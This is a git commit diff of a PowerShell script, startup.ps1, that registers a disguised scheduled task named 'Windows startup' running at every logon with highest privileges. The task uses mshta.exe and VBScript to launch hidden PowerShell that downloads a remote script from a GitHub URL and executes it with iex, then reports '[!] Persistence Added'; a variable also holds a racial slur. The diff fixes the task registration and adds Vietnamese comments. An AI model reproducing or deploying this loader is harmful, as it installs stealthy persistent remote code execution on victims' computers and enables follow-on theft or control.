5c5025aef92c0706eb64302523c38cc049ffb3d1
43a1723 <hai1723notgay@gmail.com>
2024-06-28 19:29:55 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,6 +1,15 @@
 $task_name = "Windows startup"
-New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='nigga';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+
+# Định nghĩa hành động cho tác vụ
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='nigga';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+
+# Định nghĩa trigger cho tác vụ
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
+
+# Định nghĩa cài đặt cho tác vụ
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force | Out-Null
+
+# Đăng ký tác vụ đã định nghĩa
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+
 Write-Host "[!] Persistence Added" -ForegroundColor Green
